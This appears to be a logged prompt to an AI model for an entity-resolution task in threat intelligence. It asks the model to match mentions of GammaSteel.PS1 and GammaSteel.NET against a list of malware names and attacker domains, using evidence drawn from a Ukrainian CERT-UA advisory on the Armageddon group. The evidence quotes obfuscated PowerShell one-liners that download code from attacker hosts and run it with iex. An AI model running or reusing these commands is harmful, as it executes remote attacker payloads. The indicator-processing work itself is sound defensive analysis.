=== REQUEST (gemini gemini-3.7-flash) ===
--- sampling ---
{"temperature":0}
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ків, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};whil" S5. "x.txt') $Doc); iex(iex $Doc) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddress"
Entities:
E1. GammaLoad [aka GammaLoad.PS1]
E2. TRYxaEbX.ps1
E3. z.ps1
E4. GammaLoad.PS1_v2
E5. stage1.ps1
E6. stage2.ps1
E7. OUTSTEEL
E8. TRYxaEbX_2.ps1
E9. GraphSteel
E10. HTA file
E11. ConfuserEx
E12. .NET Framework
E13. Chrome [aka macOS, Safari, Google Chrome]
E14. Ngrok
E15. MarsStealer
E16. WhisperPack
E17. HTM dropper
E18. FTPGetter
E19. JesterStealer
E20. Hashcat [aka Misha]
E21. needrestart
E22. Meterpreter
E23. Internet Explorer
E24. PowerShell [aka powershell.exe]
E25. 223329.exe
E26. POWERGAP
E27. dropper.exe [aka loader.exe]
E28. 62ea.exe
E29. SPECTR.Shell
E30. b.exe
E31. 966449.exe
E32. GammaSteel.NET
E33. HarvesterX
E34. PowerShell (powershell.exe)
E35. GammaSteel.PS1
E36. fishitor.ru
E37. acteran.ru
E38. bilitora.ru
E39. rmssrv2.ru [aka rmssrv4.ru, rmssrv3.ru]
E40. tortunas.ru
E41. apoxipodes.ru
E42. arentuk.com
E43. tiloraso.ru
E44. reteredelete.top
E45. billyhot.ru
E46. dodortar.ru
E47. candidar.ru
E48. lnk-upload.dodortar.ru
E49. leonardis.ru
E50. motocheck.in
E51. stormpredictor.host
E52. meteolink.host
E53. successilin.top
E54. erwini.ru
E55. mulleti.ru
E56. bul-opros.top
E57. iol.pt
E58. toknowall.com
E59. gopoppers.com
E60. kopratiso.ru
E61. podologaneri.it
E62. peer-gos.top
E63. districoperav.icu
E64. potrakit.ru
E65. giraffe-tour.ru
E66. rivierafamily.com
E67. naffalno.site
E68. nitikora.ru
E69. fluoxi.com
E70. tridiuma.ru
E71. golgba.com
E72. yandex.ru
E73. varanasiclick.ru
E74. olei.ro
E75. jevejosader.top
E76. enlamentedeunasesor.com
E77. milotrad.ru
E78. milotraf.ru
E79. s8.h.mchost.ru
E80. dogiraftig.com
E81. aspe.ro
E82. omyce.ru
E83. pastebin.com
E84. jokotras.ru
E85. afi-opros.top
E86. nikotod.ru
E87. mitraseo.hol.es
E88. parodadoca.ru
E89. marmaris.com.ua
E90. xsph.ru
E91. nx0.ru
E92. ncscc.gov.ua
E93. www.msftncsi.com
E94. wi-opros.top
E95. xcasinobonuses.net
E96. whoer.net
E97. servebeer.com
E98. evil.server.com
E99. 3utilities.com
E100. cloudflare-dns.com
E101. agreminj.com
E102. icanhazip.com
E103. airmauritiusticket.com
E104. ludepa.ec
E105. nirsoft.me
E106. bounceme.net
E107. ddns.net
E108. plexbd.net
E109. sytes.net
E110. brunoboys.net
E111. viewdns.net
E112. dcshost.net
E113. gov-ua.info
E114. ns.ns2-dns.com
E115. president.gov.ua.administration.vakansiyi.administration.president.gov-ua.info
E116. dyndns.com
E117. ns.ns3-dns.com
E118. freedynamicdns.org
E119. freedynamicdns.net
E120. www.facebook.com
E121. kohhd.com
E122. www.michiganmastereltiempo.com
E123. www.symantec.com
E124. atlantar.ru
E125. motoristo.ru
E126. moolin.ru
E127. bubenci.ru
E128. callsol.ru
E129. clipperso.ru
E130. cooperi.ru
E131. detroito.ru
E132. farafauler.ru
E133. flayga.ru
E134. ganara.ru
E135. hawksi.ru
E136. hofsteder.ru
E137. kilitro.ru
E138. kurapat.ru
E139. lnasfe.ru
E140. lopasts.ru
E141. mafirti.ru
E142. metanat.ru
E143. mitlubald.ru
E144. paparat.ru
E145. pasamart.ru
E146. qkcew.ru
E147. rncsq.ru
E148. tarlit.ru
E149. tbwelo.ru
E150. wicksl.ru
E151. xcqef.ru
E152. nxkad.ru
E153. dnslookup.seowebchecker.com
E154. tools.nexcess.net
E155. viewdns.info
E156. www.portcheckers.com
E157. lover.printing82.detroito.ru
Mentions:
M1. "GammaSteel.PS1" (Software) — options: E1, E2, E3, E4 — ctx: S1
M2. "GammaSteel.NET" (Software) — options: E11, E12, E1, E4 — ctx: S1
